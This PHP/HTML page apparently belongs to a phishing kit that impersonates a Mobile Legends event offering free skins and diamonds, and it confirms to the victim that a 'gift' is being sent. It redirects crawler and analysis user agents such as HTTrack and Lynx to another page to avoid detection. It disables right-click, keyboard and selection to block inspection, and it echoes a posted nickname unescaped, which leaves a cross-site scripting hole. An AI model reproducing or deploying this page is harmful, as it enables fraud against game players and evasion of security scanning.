<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$nick = $_POST['nick'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($nick == ""){
    header("Location: index.php");
}
?>
<html lang="en">
<head>
<!-- Required meta tags -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta property="og:title" content="Mobile Legends Event">
<meta property="og:description" content="Get skins and diamonds for free">
<meta property="og:image" content="https://img.mobilelegends.com/group1/M00/00/AA/Cq2Ixl-X26iAO3ViAALvQpm6o-k575.jpg?width=572&amp;height=269">
<!-- Bootstrap CSS -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
<link rel="stylesheet" href="static/css/ryucodex.css">
<title>Mobile Legends Events</title>
</head>
<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" ondragstart="return false" onselectstart="return false" style="-moz-user-select: none; cursor: default;">
<div id="bg"></div>
<div id="app">
	<div class="ryu-header">
		<img src="static/img/logo.png">
		<div class="ryu-text-header">
			 MOBILE LEGENDS <span>FREE SKINS AND DIAMONDS</span>
		</div>
	</div>
	<div class="ryu-banner">
		<div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
			<div class="carousel-inner">
				<div class="carousel-item active">
					<img src="https://i.ibb.co/C832Ykg/Capture.png" class="d-block w-100" alt="...">
				</div>
				<div class="carousel-item">
					<img src="https://i.ibb.co/j3wDpDT/Capture.png" class="d-block w-100" alt="...">
				</div>
			</div>
		</div>
	</div>
	<div class="row mt-3">
		<div class="col-md-12 col-12">
			<div class="app-subheader">
				<img src="static/img/card.c777c1a0.png" alt="" style="height: 58px;">
				<span class="txt-sub w-75" style="margin-top: -50px; font-size: 14px;">Congratulations <?php echo $nick;?>, Your gift is in the process of being sent, Thank you.</span>
			</div>
		</div>
	</div>
	<div class="row mt-4">
		<div class="col-md-12 col-12">
			<div class="scroll text-white text-center">
				<button type="button" onclick="location.href='./';" class="btn btn-primary btn-custom w-75" style="font-size: 13px;">Logout</button>
			</div>
		</div>
	</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<script src="static/js/imryu.js"></script>
</body>
</html>
